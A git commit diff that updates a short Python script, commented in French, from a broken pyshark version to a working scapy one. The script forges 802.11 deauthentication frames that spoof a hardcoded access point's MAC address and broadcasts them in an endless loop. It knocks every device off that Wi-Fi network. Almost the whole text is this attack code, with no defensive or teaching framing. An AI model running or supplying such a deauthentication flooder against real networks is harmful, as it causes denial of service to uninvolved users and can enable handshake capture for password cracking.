c7e4c9f349d668bca629e4a750639dedbd6af52a
FoXhack1 <fox.pclyc@gmail.com>
2024-10-22 16:05:07 +0200

    Update wifi (1).py

--- wifi (1).py
+++ wifi (1).py
@@ -1,19 +1,19 @@
-import pyshark
+from scapy.all import *
+import time
 
 def deauth_all(ap_mac, interface):
     # Créer un paquet de déauthentification
-    packet = pyshark.Packet()
-    packet.layers.append(pyshark.Layer('Dot11'))
-    packet.layers.append(pyshark.Layer('Dot11Deauth'))
-    packet.layers[0].addr1 = 'ff:ff:ff:ff:ff:ff'
-    packet.layers[0].addr2 = ap_mac
-    packet.layers[0].addr3 = ap_mac
-    packet.layers[1].reason = 7
+    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
+    packet /= Dot11Deauth(reason=7)  # 7 = raison pour déauthentification
 
-    # Envoyer le paquet en boucle
-    while True:
-        packet.send(interface)
-        print(f"Deauthenticating all devices from {ap_mac}")
+    # Envoyer le paquet en boucle avec une pause entre chaque envoi
+    try:
+        while True:
+            sendp(packet, iface=interface, count=1, verbose=False)
+            print(f"Deauthenticating all devices from {ap_mac}")
+            time.sleep(0.1)  # Pause de 100 ms entre chaque envoi
+    except KeyboardInterrupt:
+        print("Déauthentification interrompue.")
 
 # Remplacez par l'adresse MAC du point d'accès et l'interface réseau
 ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
